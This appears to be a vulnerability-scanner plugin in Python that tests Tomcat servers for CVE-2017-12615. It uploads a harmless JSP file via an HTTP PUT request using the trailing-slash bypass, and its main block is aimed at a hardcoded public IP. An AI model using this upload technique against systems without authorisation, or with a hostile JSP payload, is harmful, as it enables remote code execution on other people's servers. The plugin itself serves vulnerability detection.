#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: Fleey
# ref: http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81
# title: Tomcat 远程代码执行漏洞 (CVE-2017-12615)

def assign(service_list):
    if 'tomcat' in service_list:
        return True
    return False

def audit(target_url, user_agent, cookie):
    code, head, res, _, _ = curl(target_url+'/SafeTest_002.jsp/', request_data='<%out.println("test");%>', headers={
        'User-Agent': user_agent,
        'Cookie': cookie
    }, request_type="post", method="PUT")
    if code == 204 or code == 204:
        send_scan_result('Tomcat 远程代码执行漏洞 (CVE-2017-12615)',
                         'http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81', 3)


if __name__ == '__main__':
    def send_scan_result(title, body, level):
        print('[+][' + str(level) + ']' + '[' + title + ']' + body)


    from tootls import curl2 as curl

    audit('http://43.248.187.89:8082/', 'none', 'cookie')
